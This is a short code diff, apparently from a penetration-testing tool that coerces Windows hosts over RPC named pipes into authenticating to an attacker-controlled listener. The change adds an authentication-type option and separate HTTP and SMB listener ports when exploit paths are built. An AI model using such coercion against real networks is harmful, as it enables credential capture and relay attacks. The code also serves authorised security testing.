@@ -69,7 +69,7 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                         print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                         for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version], key=lambda x:x.function["name"]):
 
-                            exploit_paths = msprotocol_class.generate_exploit_templates()
+                            exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)
 
                             stop_exploiting_this_function = False
                             for listener_type, exploitpath in exploit_paths:
@@ -80,7 +80,8 @@ def action_coerce(target, available_methods, options, credentials, reporter):
                                 exploitpath = generate_exploit_path_from_template(
                                     template=exploitpath,
                                     listener=options.listener_ip,
-                                    port=http_listen_port
+                                    http_listen_port=options.http_port,
+                                    smb_listen_port=options.smb_port
                                 )
 
                                 msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
